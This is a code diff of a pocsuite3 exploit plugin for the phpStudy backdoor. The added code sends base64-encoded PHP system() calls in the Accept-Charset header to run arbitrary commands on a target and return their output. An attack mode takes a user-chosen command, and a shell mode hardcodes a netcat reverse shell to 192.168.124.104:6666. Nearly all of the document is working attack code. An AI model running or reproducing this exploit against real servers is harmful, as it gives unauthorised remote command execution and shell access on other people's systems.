@@ -2,9 +2,11 @@ from collections import OrderedDict
 from pocsuite3.api import (
     Output,
     POCBase,
+    random_str,
     POC_CATEGORY,
     register_poc,
     requests,
+    logger,
     VUL_TYPE,
     get_listener_ip,
     get_listener_port,
@@ -47,60 +49,92 @@ class PhpstudyPoc(POCBase):
             poc的用法描述
         """  # POC用法描述
 
+
+    # 获取本脚本的参数信息
     def _options(self):
         opt = OrderedDict()  # value = self.get_option('key')
-        opt["string"] = OptString("phpinfo();", description="这个poc需要用户登录，请输入登录账号", require=True)
-        opt["integer"] = OptInteger(
-            "", description="这个poc需要用户密码，请输出用户密码", require=False
-        )
+        opt["cmd"] = OptString("ipconfig", description="指定一个执行命令指令", require=True)
+
         return opt
 
-    # 如果命令行不带参数，_verify就会默认执行
-    def _verify(self):
-        verify_cmd = "phpinfo()"
-        verify_code = f"eval({verify_cmd});"
-        verify_code_base64 = base64.b64encode(verify_code.encode()).decode()
-        verify_header = {
+    def exploit(self,param):
+        excute_cmd = f"system('{param}');"
+        print(excute_cmd)
+
+        base64_excute_cmd = base64.b64encode(excute_cmd.encode()).decode()
+
+        headers = {
         'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 Edg/133.0.0.0',
-        'Accept-Charset': f'{verify_code_base64}',
+        'Accept-Charset': f'{base64_excute_cmd}',
         'Accept-Encoding': 'gzip,deflate'
         }
 
-        # 验证代码
-        try:
-            responese = requests.get(url=self.url, headers=verify_header)
-        except:
-            pass
-        else:
-            if verify_cmd in responese.text:
-                result = {}
-                result['VerifyInfo'] = {}
-                result['VerifyInfo']['URL'] = self.url
-                result['VerifyInfo']['PAYLOAD'] = verify_code
-                return self.parse_output(result)
+        result = requests.get(self.url, headers=headers)
+
+
+        return result
+
+    # 漏洞的核心方法
+    def _exploit(self, param=''):
+        #加截断标识
+        param = f"echo 11111111&&{param}&&echo 22222222"
+        # headers = {'Content-Type': 'application/x-www-form-urlencoded'}
+        excute_cmd = f"system('{param}');"
+
+        print(excute_cmd)
+
+        base64_excute_cmd = base64.b64encode(excute_cmd.encode()).decode()
+        headers = {
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 Edg/133.0.0.0',
+        'Accept-Charset': f'{base64_excute_cmd}',
+        'Accept-Encoding': 'gzip,deflate'
+        }
+
+        res = requests.get(self.url, headers=headers)
+
+        # 处理返回信息
+        respond = res.content[res.content.find(b'11111111') + 8:res.content.find(b'22222222')]
+        # result = respond.decode('GBK')
+        logger.debug(respond)
+        return respond
+
+    # 如果命令行不带参数，_verify就会默认执行
+    def _verify(self):
+        result = {}
+        flag = random_str(6)
+        param = f'echo {flag}'
+        res = self._exploit(param)
+        print(type(res))
+        if res and flag in res:
+            result['VerifyInfo'] = {}
+            result['VerifyInfo']['URL'] = self.url
+            result['VerifyInfo'][param] = flag
+        # 统一调用 self.parse_output() 返回结果
+        return self.parse_output(result)
+
 
     def _attack(self):
-        output = Output(self)
         result = {}
-        # 攻击代码
-        pass
+        # self.get_option() 方法可以获取自定义的命令行参数
+        param = self.get_option('cmd')
+        res = self._exploit(param)
+        result['VerifyInfo'] = {}
+        result['VerifyInfo']['URL'] = self.url
+        result['VerifyInfo'][param] = res
+        # 统一调用 self.parse_output() 返回结果
+        return self.parse_output(result)
 
     def _shell(self):
-        """
-        shell模式下，只能运行单个PoC脚本，控制台会进入shell交互模式执行命令及输出
-        """
-        cmd = REVERSE_PAYLOAD.BASH.format(get_listener_ip(), get_listener_port())
-
-        # 攻击代码 execute cmd
-        pass
-
-
-def other_fuc():
-    pass
+        pss = "nc.exe 192.168.124.104 6666 -e cmd"
+        try:
+            result = self.exploit(pss)
+            print(result)
+        except Exception:
+            pass
+        else:
+            return self.parse_output(result)
 
 
-def other_utils_func():
-    pass
 
 
 # 注册 DemoPOC 类
